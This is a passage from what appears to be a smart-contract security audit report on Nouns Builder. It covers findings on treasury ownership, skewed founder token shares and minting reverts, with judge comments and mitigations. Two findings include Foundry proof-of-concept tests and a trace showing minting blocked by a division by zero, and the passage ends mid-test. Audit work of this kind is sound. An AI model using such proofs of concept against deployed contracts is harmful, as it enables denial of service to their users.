1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify <code>transferOwnership()</code> in the relevant contracts so that if ownership is transferred, then <code>settings.treasury</code> is changed accordingly.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/468\">kulkarohan (Nouns Builder) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/468#issuecomment-1258725780\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to the possibility of decoupling Treasury and Governor via Upgradeable.transferOwnership Auction.treasury may be set to the wrong address.</p>\n<p>Personally I think that the decoupling between Auction, Governor and Treasury should be removed as ultimately this system is meant to be “immutable” and a migration could be achieved via a full redeploy and then a proposal to transfer funds.</p>\n<p>However, the situation described by the Warden can happen and in those cases funds would be lost or sent to the wrong contract.</p>\n<p>Because a timelock needs to vote this, I’m inclined to reduce severity.</p>\n<p>However, because the contract functionality allows Ownership Transfer by default, but there’s no custom code to update the settings, I think Medium Severity is appropriate as in certain cases the contract will not behave as intended.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-24-token-founder-percentages-not-always-respected\" style=\"position:relative;\"><a href=\"#m-24-token-founder-percentages-not-always-respected\" aria-label=\"m 24 token founder percentages not always respected permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107\">[M-24] Token: Founder percentages not always respected</a></h2>\n<p><em>Submitted by Lambda, also found by arcoun</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/Token.sol#L110\">Token.sol#L110</a><br></p>\n<p>Because of the “greedy” minting scheme for founders (tokens to founders are minted until <code>_isForFounder</code> returns <code>false</code>, i.e. until there is an unset <code>tokenRecipient[tokenId % 100]</code>), it can happen that the actual percentages of tokens that the founders receive deviate significantly from the desired percentages:</p>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>Imagine we are in a situation where one founder has a 51% share and the other a 48% share. Because <code>schedule</code> is set to 1 for the first founder, <code>tokenRecipient[0] ... tokenRecipient[50]</code> will be set to his address. <code>tokenRecipient[51], tokenRecipient[53], ...</code> is set to the address of the second founder. Now let’s say a mint happens just before the <code>vestExpiry</code> and when <code>tokenId % 100 == 0</code>. In such a situation, founder 1 will get 51 tokens (because of the consecutive entries in <code>tokenRecipients</code>) and founder 2 will get 1 token (because of the entry in <code>tokenRecipient[51]</code>, which is also consecutive. Let’s say that the next mint happens after the vest expiration, which means that no founders get additional tokens.</p>\n<p>In such a situation, founder 1 got 51 of the “last 100” token IDs, whereas founder 2 only got 1. Therefore, the overall percentage of tokens that those founders got will not be 51% and 40%. When the vest expiration was set to a time far in the future, it will be close to it, but when the vest timespan was only short, it can be very bad. In the extreme case where the expiration is set such that only 1 mint call causes mints for founders, founder 1 will have 51 tokens and founder 2 only 1, meaning the percentages are 51% / 1% instead of 51% / 48%!</p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using another distribution scheme. Instead of the current “greedy” scheme (minting until a slot is free), it would make sense to mint the tokens for the founders every 100 tokens, i.e. everytime when <code>tokenId % 100 == 0</code>. Like that, it is ensured that the actual percentages are equal to the desired percentages.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107#issuecomment-1258737529\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown a specific combination of <code>founderPct</code> that will unfairly reward one founder at the detriment of another.</p>\n<p>Personally I’d recommend simming a set of schedules, perhaps via Fuzzing (which would have also enriched this submission), to find a solution that solves most use cases.</p>\n<p>Because the submission shows a way to lose tokens, in a way that is reliant on configuration, I agree with Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-25-metadatarenderer-contract-raise-error-when-minting\" style=\"position:relative;\"><a href=\"#m-25-metadatarenderer-contract-raise-error-when-minting\" aria-label=\"m 25 metadatarenderer contract raise error when minting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69\">[M-25] MetadataRenderer contract raise error when minting</a></h2>\n<p><em>Submitted by Migue</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L194\">MetadataRenderer.sol#L194</a><br></p>\n<p>It is not possible to mint a ERC721 token if its properties has different length than its items.</p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I run the following test to reproduce the error:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    deployMock();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.prank(address(governor));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    string[] memory _names = new string[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _names[0] = &quot;propertyName&quot;; //fill _names with some value</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MetadataRendererTypesV1.ItemParam[] memory _items; //define empty array</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MetadataRendererTypesV1.IPFSGroup memory _ipfsGroup; </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _ipfsGroup.baseUri = &quot;&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _ipfsGroup.extension = &quot;&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MetadataRenderer(token.metadataRenderer()).addProperties(_names, _items, _ipfsGroup); //call add property with _items array empty.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.prank(address(auction));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 success = token.mint();//error happens inside here</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assert(success != 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span></code></pre>\n<p>Log from Foundry console:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">├─ [736] TOKEN::metadataRenderer() [staticcall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   ├─ [353] Token::metadataRenderer() [delegatecall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   └─ ← METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   └─ ← METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">├─ [78618] METADATA_RENDERER::addProperties([&quot;propertyName&quot;], [], (&quot;&quot;, &quot;&quot;))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   ├─ [78172] MetadataRenderer::addProperties([&quot;propertyName&quot;], [], (&quot;&quot;, &quot;&quot;)) [delegatecall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   ├─ emit OwnerUpdated(prevOwner: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], newOwner: TREASURY: [0xf8cf955543f1ce957b81c1786be64d5fc96ad7b5])      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   ├─ emit PropertyAdded(id: 0, name: &quot;propertyName&quot;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   └─ ← ()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   └─ ← ()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">├─ [0] VM::stopPrank()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   └─ ← ()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">├─ [0] VM::prank(AUCTION: [0x9a1450e42d752b8731bc88f20dbaa9154642f1e6])</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   └─ ← ()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">├─ [121037] TOKEN::mint()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   ├─ [120650] Token::mint() [delegatecall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], tokenId: 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   ├─ emit DelegateVotesChanged(delegate: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], prevTotalVotes: 0, newTotalVotes: 1)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   ├─ [25762] METADATA_RENDERER::onMinted(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   │   ├─ [25372] MetadataRenderer::onMinted(0) [delegatecall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   │   │   └─ ← &quot;Division or modulo by 0&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   │   └─ ← &quot;Division or modulo by 0&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   │   └─ ← &quot;Division or modulo by 0&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   └─ ← &quot;Division or modulo by 0&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">└─ ← &quot;Division or modulo by 0&quot;</span></span></code></pre>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry<br>\nManual</p>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It could be mitigated checking length of both arrays in MetadataRenderer.addProperties() method.</p>\n<p>It could be done after those lines: <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L111-L115\">MetadataRenderer.sol#L111-L115</a>.</p>\n<p>Also I recommend to move those declaration and new validation at the beginning to save gas.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69#issuecomment-1258747070\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to other reports, here the Warden has shown how to get a revert by having a mismatching length between properties and items.</p>\n<p>While a mitigating aspect for the finding is the fact that Governance will set these values, and most of the times these values will be set at deployment time.\nThe warden has shown how the code could revert in a way that we can consider unintended.</p>\n<p>The impact of the finding is that a new proposal would need to be raised to fix the mismatching length, until then no auctions could run.</p>\n<p>Because of the specificity of the report, the actual DOS outcome and the reliance on “misinput”, I believe that the finding is of Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-26-minting-is-not-possible-when-a-property-has-no-items\" style=\"position:relative;\"><a href=\"#m-26-minting-is-not-possible-when-a-property-has-no-items\" aria-label=\"m 26 minting is not possible when a property has no items permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459\">[M-26] Minting is not possible when a property has no items</a></h2>\n<p><em>Submitted by Jeiwan</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L194\">MetadataRenderer.sol#L194</a><br></p>\n<p>If a property without items was added, minting becomes impossible. To enable minting again, an item must be added to the\nproperty, which is only possible through a new governance proposal.</p>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the following test case:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRevert_MintingWithPropertyWithoutItems</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Deploying a token and a metadata renderer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tknImpl</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Token</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tkn</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Token</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC1967Proxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tknImpl</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rndrImpl</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MetadataRenderer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MetadataRenderer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rndr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">MetadataRenderer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC1967Proxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rndrImpl</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initString</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FounderParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">founders</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk10\">FounderParams</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">founders</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FounderParams</span><span class=\"mtk1\">({ </span><span class=\"mtk12\">wallet:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ownershipPct:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vestExpiry:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\"> });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founders</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initString</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initString</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Exploit starts here:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Creating a property without items and adding it to the token.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">names</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ItemParam</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">items</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk10\">ItemParam</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">IPFSGroup</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ipfsGroup</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">IPFSGroup</span><span class=\"mtk1\">({ </span><span class=\"mtk12\">baseUri:</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;base&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">extension:</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;ext&quot;</span><span class=\"mtk1\"> });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">names</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span 